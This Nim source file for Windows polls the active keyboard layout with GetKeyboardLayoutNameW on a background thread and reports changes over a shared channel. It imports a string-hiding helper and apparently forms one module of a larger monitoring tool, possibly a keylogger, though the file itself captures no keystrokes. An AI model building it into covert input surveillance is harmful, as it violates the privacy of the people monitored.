from os import sleep

from winim/inc/winuser import GetKeyboardLayoutNameW
from winim/inc/winuser import KL_NAMELENGTH

from winim/inc/windef import HANDLE
from winim/inc/windef import LPWSTR

from winim/winstr import winstrConverterWStringToLPWSTR
from winim/winstr import newWString
from winim/winstr import `$`

import ../functions/hideString

from ../flags import KEYBOARD_LOCALE_THREAD_CHECK_INTERVAL

from ../channels import mainChannel

type localeResult = tuple[worked: bool, data: string]

var localeThread: Channel[localeResult]

proc GetLocale(): void {.thread.} =
  var data: localeResult = (false, "")
  var pwszKLID: LPWSTR = newWString(KL_NAMELENGTH)

  if GetKeyboardLayoutNameW(pwszKLID) != 0:
    data.data = $pwszKLID

    if data.data != "":
      data.worked = true

  localeThread.send data

proc initKeyboardLocaleThread*(): void {.thread.} =
  open localeThread

  var prevLocale: string = ""

  while true:
    var thread: Thread[void]

    createThread(thread, GetLocale)

    joinThread thread

    let data: tuple[dataAvailable: bool,
        msg: localeResult] = localeThread.tryRecv()

    if data.dataAvailable:
      let (worked, locale) = data.msg

      if worked and locale != prevLocale:
        mainChannel.send ("kl", locale)
        prevLocale = locale
    sleep(KEYBOARD_LOCALE_THREAD_CHECK_INTERVAL)

  close localeThread
